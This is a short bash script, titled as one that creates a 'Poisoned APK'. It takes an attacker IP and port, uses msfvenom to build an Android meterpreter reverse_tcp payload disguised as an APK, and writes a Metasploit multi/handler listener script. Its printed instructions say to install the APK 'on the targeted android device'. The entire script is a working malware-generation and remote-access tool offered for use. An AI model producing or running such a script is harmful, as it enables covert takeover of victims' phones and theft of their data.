
# Script to create a Poisoned APK
#
# Req = metasploit

#IPv4 Add
read -p "Your IP [localhost]: " your_ip
your_ip=${your_ip:-localhost}

#TCP Port
read -p "Port [4444]: " your_port
your_port=${your_port:-4444}

#APK Filename
read -p "APK Filename [malware]: " apkfn
apkfn=${apkfn:-malware}

mkdir /home/$USER/Poison/$apkfn
cd /home/$USER/Poison/$apkfn

printf "just waaaaiit"

#Exec
msfvenom --platform android -p android/meterpreter/reverse_tcp lhost="$your_ip" lport="$your_port" R -o "$apkfn".apk

printf " \n Host: "$your_ip" \n Port: "$your_port" \n APK Filename: "$apkfn".apk " >> APKinfo.txt

clear

printf "APK File & Listener Generated in â†™"
pwd

export score="---------------------------------------------------------"

echo $score
printf "\n"
printf "install the apk file on the targeted android device"
printf "\n"
printf "to execute the listener just bash or ./ the .sh file"
printf "\n"
echo $score

#Listener Generator
printf 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set ReverseListenerBindAddress localhost; set LHOST "$your_ip"; set LPORT "$your_port"; exploit"' >> "$apkfn"listener.sh